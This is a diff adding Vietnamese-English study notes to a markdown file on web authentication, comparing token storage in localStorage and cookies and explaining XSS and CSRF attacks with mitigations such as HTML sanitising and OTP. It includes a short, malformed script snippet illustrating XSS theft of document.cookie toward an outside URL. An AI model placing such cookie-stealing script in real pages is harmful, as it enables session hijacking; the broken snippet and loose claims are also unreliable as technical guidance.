@@ -1,5 +1,28 @@
 ### How it work
 
+1. Auth: cookies or localStorage
+
+- Local Storage --> XSS attack
+- Cookies --> CSRF attack
+
+---
+
+Khi login, server trả về token, mình sẽ lưu token ở đâu ? local storage or cookies
+
+- Với cac trang liên quan tới tiền bạc thì nên lưu token hoặc các thông tin ở cookies -> vì nó an toàn hơn local storage
+
+  > XSS Attack: hacker bằng 1 cách nào đó họ embed 1 đoạn malicious code into our website, and user not aware about this and user accidentally execute this code -> _can using **sanitize html** to clean this_
+
+  ```html
+  <script>
+    src = "https://mysite.in?+document.cookie;";
+  </script>
+  ```
+
+  > CSRF Attack: Người dùng vô tình click vào 1 link độc hại (có thể là chuyển tiền) -> với trường hợp này có thể dùng thêm xác thực 2 bước hoặc là phải nhập mã OTP để có thể chuyển tiền
+
+---
+
 **All the CSRF attacks almost related about `cookie`. if your site do not using cookie, ignore this vulnerability**
 
 When a user tries to access a site, the browser often automatically includes the credentials in the request, to make the login process more convenient. These credentials may include the user’s session cookie, basic authentication credentials, IP address, and Windows domain credentials.
